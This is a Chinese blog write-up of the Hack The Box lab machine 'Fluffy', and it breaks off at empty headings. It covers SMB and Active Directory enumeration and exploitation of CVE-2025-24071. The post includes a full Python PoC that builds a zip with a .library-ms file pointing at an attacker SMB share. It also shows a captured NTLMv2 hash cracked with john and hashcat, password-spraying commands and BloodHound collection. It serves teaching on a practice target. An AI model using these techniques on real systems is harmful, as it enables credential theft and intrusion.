https://blog.csdn.net/PEIWIN/article/details/148265062

首先`nmap -sV -sC -v 10.10.11.69`进行扫描，发现开放的端口和服务很多：

```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-01 10:00:24Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

这里看writeup是有80端口的，但是我们没扫出来。其实也用不上，关键信息在ldap端口的详细信息：

```
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|_ssl-date: 2025-10-01T10:02:15+00:00; +6h59m59s from scanner time.
```

这里看到域名是fluffy.htb，DNS是DC01.fluffy.htb，我们要把它们写入/etc/hosts中

注意这里DC要大写，小写不成功（writeup中是错误的）

这里一直没找到writeup连接smb的账户密码哪里来的，最后发现是直接给出的：

```
Machine Information

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
```

之前我们连接smb服务用的是`smbclient`，连接winrm服务用的`evil-winrm`，这里介绍一个新工具：`NetExec`  它的前身是writeup中使用的`CrackMapExec`,集成了SMB、HTTP、WinRM、MSSQL等多种协议的攻击和枚举功能，在后渗透阶段中属于是必备工具。

```
nxc smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares
```

可以枚举有哪些共享文件。

这里看别人的writeup还有一个思路：

`nxc smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --users`

查看还有哪些用户，然后用已知密码一个个尝试（“喷洒”），看看有没有密码复用。

这里可能是因为网络原因nxc没有枚举出来，我们直接用`smbclient`了：

```
└─# smbclient //10.10.11.69/IT -U 'j.fleischman%J0elTHEM4n1990!'   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 02:33:33 2025
  ..                                  D        0  Wed Oct  1 02:33:33 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 23:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 23:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 23:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 23:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 22:31:07 2025
```

找到了IT下的Upgrade_Notice.pdf，下载看看，上面提到的全是CVE-2025-xxxx,具体如下

```
CVE ID             Severity
CVE-2025-24996     Critical
CVE-2025-24071     Critical
CVE-2025-46785     High
CVE-2025-29968     High
CVE-2025-21193     Medium
CVE-2025-3445      Low
```

最严重的就是`CVE-2025-24996`和`CVE-2025-24071`.前者公开信息太少了，我们找后者

CVE-2025-24071:

```
漏洞类型	信息泄露（欺骗漏洞）
CVSS 3.1评分	7.5（重要）
利用前提	用户需解压包含恶意.library-ms文件的压缩包
主要危害	NTLMv2哈希泄露，可能导致哈希传递攻击、横向移动或权限提升
修复状态	微软已在2025年3月的补丁星期二发布安全更新
```

此漏洞的核心是`.library-ms` 文件。此文件本质上是**一个XML格式的配置文件**，用于定义Windows资源管理器中的"库"（例如文档、图片库）。其XML结构内包含一个 `<simpleLocation>` 标签，其中的 `<url>` 项可以指向一个网络位置（如 `\\192.168.1.116\shared`）。用户解压一个包含`.library-ms` 文件的ZIP或RAR压缩包时，**Windows文件资源管理器会自动解析此文件**。一旦读取到在`<url>`中嵌入的SMB路径，就会自动触发NTLM验证流程，泄露NTLMv2哈希。这个Staring Point的Responder是一样的，只不过那里通过远程文件包含漏洞访问SMB。

一个`.library-ms` 文件结构大致如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\攻击者IP\共享名</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

IT目录下有很多两个压缩包就提示了，而且IT目录有写的权限，我们可以上传包含`.library-ms`文件的压缩包，然后等靶机上的用户解压即可。

压缩包我们可以手动做，写一个`.library-ms` 文件再压缩即可，但是也可以使用python脚本生成，如：https://github.com/0x6rss/CVE-2025-24071_PoC

```
import os
import zipfile

def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")
    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)

    with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)

    if os.path.exists(library_file_name):
        os.remove(library_file_name)

    print("completed")

if __name__ == "__main__":
    main()
```

其实也就是写文件然后压缩，很简单。

开启responder工具监听一个，然后生成压缩包并上传,成功获取NTLMv2HASH：

```
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:b9df2e4125bc751e:E90B260E0620600C09AF8BEAF9E693CA:010100000000000080338F31DA32DC014FB4F7781D18B31C0000000002000800340039005700590001001E00570049004E002D004E004C004C0035004C0031003700450042005A00520004003400570049004E002D004E004C004C0035004C0031003700450042005A0052002E0034003900570059002E004C004F00430041004C000300140034003900570059002E004C004F00430041004C000500140034003900570059002E004C004F00430041004C000700080080338F31DA32DC01060004000200000008003000300000000000000001000000002000000DE3EE5F08BBCBB43BC140A9B4E65BFBD5BB411D466CA3DFDF0765CA7C67D67E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0038000000000000000000
```

john或者hashcat跑一下：

```
┌──(root㉿kali)-[/home/orange/HTB/CVE-2025-24071_PoC]
└─# john -w=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:02 DONE (2025-10-01 13:53) 0.3623g/s 1636Kp/s 1636Kc/s 1636KC/s prrm30w..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

跑出来密码是prometheusx-303

hashcat指令如下：

```
hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
# hashcat --help | grep 5600
   5600 | NetNTLMv2       |  Network Protocol
```

5600就是指NetNTLMv2了。

我们首先想到的肯定是winrm登录

```
nxc winrm 10.10.11.69 -u p.aliga -p prometheusx-303
evil-winrm -i 10.10.11.69 -u p.aliga -p prometheusx-303 
```

发现还是不能登录

这里引用一个新工具：BloodHound

下面为deepseek生成：

> 简单来说，BloodHound 是一个基于图的**Active Directory (活动目录) 关系挖掘和攻击路径分析工具**。
>
> 你可以把它想象成一张**藏宝图**。在复杂的活动目录环境中，有成千上万的用户、计算机、组、权限关系。手动去分析“谁可以访问什么”、“谁能控制谁”几乎是不可能的。BloodHound 的作用就是自动绘制出这张巨大的关系网，并**高亮显示出从当前攻击者位置到目标（例如域管理员权限）的最短、最有效的攻击路径**。
>
> 它由两部分组成：
>
> 1. **BloodHound 前端 (UI)**：一个图形化界面，用于显示和分析数据。它通常运行在攻击者的机器上（如 Kali Linux）。
> 2. **SharpHound / BloodHound.py 采集器**：一个数据收集脚本，需要在目标域内的 Windows 主机上执行。它的任务是收集活动目录中的各种关系数据，并生成一个 `.json` 文件，然后被导入到前端进行分析。

~~BloodHound 使用 **Neo4j 图数据库** 作为后端，它会解析并存储采集器采集到的所有关系，构建出一个可视化图表。~~

~~所以我们先下载neo4j:~~

~~bloodhound-python是kali自带的：~~

~~生成了很多json文件，这些就是采集器采集的数据。~~

~~我们先启动neo4j:`neo4j console`~~

~~依据提示访问`http://localhost:7474/`~~

~~默认用户名密码都是`neo4j`，首次登录会提示你更改密码:~~

~~然后下载图形化分析工具：`sudo apt install bloodhound`~~

**BloodHound CE（Community Edition）** 是其最新重构版本，基于 Docker 构建，更轻量、更模块化，并引入了强大的 REST API 与 CLI 工具 `bloodhound-cli`，用于自动化部署和管理。

先安装`bloodhound-cli`:

```
mkdir -p /opt/bloodhound && cd /opt/bloodhound
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
ln -sv /opt/bloodhound/bloodhound-cli /usr/local/bin/bloodhound-cli
```

然后安装BloodHound CE

```
bloodhound-cli install
```

然后登录并且重置密码。

我们需要用kali自带的bloodhound-python采集信息，生成json文件，再上传解析：

```
└─# bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c ALL  -ns 10.10.11.69
```



kerberoasting 攻击：

影子凭证攻击：